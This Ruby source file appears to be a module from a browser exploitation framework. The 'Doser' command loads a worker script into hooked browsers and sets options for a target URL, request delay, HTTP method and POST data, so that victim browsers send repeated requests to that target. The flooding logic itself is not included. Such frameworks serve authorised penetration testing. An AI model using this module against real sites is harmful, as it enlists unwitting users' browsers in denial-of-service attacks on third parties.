#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (Server) - https://serverproject.com
# See the file 'doc/COPYING' for copying permission
#
class Doser < Server::Core::Command
  def pre_send
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/network/DOSer/worker.js', '/worker', 'js')
  end

  def self.options
    [
      { 'name' => 'url', 'ui_label' => 'URL', 'value' => 'http://target/path' },
      { 'name' => 'delay', 'ui_label' => 'Delay between requests (ms)', 'value' => '10' },
      { 'name' => 'method', 'ui_label' => 'HTTP Method', 'value' => 'POST' },
      { 'name' => 'post_data', 'ui_label' => 'POST data', 'value' => 'key=value&&Aa=Aa&BB' }
    ]
  end

  def post_execute
    return if @datastore['result'].nil?

    save({ 'result' => @datastore['result'] })
  end
end
